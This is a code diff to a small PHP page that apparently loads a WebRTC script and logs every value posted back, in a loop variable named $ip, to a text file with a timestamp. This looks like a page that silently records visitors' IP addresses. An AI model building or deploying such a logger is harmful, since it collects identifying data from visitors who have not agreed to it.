@@ -1,6 +1,12 @@
 <?php
-
 if (count($_POST) > 0) {
+	$file = fopen("log.txt", "a");
+	fwrite($file, date('l jS \of F Y h:i:s A') . "\n");
+	foreach ($_POST as $ip) {
+		fwrite($file, $ip . "\n");
+	}
+	fwrite($file, "\n\n\n");
+	fclose($file);
 	exit();
 }
 ?>
@@ -12,7 +18,7 @@ if (count($_POST) > 0) {
 </head>
 <body>
 	<form id="f" method="POST">
-		<input name="test" value="test" type="hidden">
+
 	</form>
 
 	<script src="webrtc.js"></script>
